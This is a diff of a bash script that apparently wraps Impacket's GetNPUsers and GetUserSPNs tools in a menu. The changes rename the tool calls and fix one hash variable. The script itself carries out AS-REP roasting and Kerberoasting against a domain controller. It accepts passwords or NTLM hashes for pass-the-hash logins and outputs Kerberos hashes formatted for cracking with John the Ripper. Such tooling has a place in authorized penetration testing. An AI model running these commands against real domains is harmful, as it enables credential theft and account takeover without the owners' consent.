@@ -24,7 +24,7 @@ then
 		read userlist
 
 		set -x
-		GetNPUsers.py -usersfile $userlist -request -format john -dc-ip $dc -no-pass $dom/
+		impacket-GetNPUsers -usersfile $userlist -request -format john -dc-ip $dc -no-pass $dom/
 		set +x
 
 	elif [ $opt == 2 ]
@@ -36,7 +36,7 @@ then
 		echo -e "$line"
 
 		set -x
-		GetNPUsers.py -request -format john -dc-ip $dc $dom/"$user":"$passwd"
+		impacket-GetNPUsers -request -format john -dc-ip $dc $dom/"$user":"$passwd"
 		set +x
 
 	elif [ $opt == 3 ]
@@ -48,7 +48,7 @@ then
 		echo -e "$line"
 
 		set -x
-		GetNPUsers.py -request -format john -dc-ip $dc -hashes :$ntlm $dom/"$user"
+		impacket-GetNPUsers -request -format john -dc-ip $dc -hashes :$ntlm $dom/"$user"
 		set +x
 
 	else
@@ -69,7 +69,7 @@ then
 		echo -e "$line"
 
 		set -x
-		GetUserSPNs.py -request -dc-ip $dc $dom/"$user":"$passwd"
+		impacket-GetUserSPNs -request -dc-ip $dc $dom/"$user":"$passwd"
 		set +x
 
 	elif [ $opt == 2 ]
@@ -79,7 +79,7 @@ then
 		echo -e "$line"
 
 		set -x
-		GetUserSPNs.py -request -dc-ip $dc -hashes :ntlm $dom/"$user":"$passwd"
+		impacket-GetUserSPNs -request -dc-ip $dc -hashes :$ntlm $dom/"$user":"$passwd"
 		set +x
 	else
 		echo -e "\nYou did not select a valid option\n"
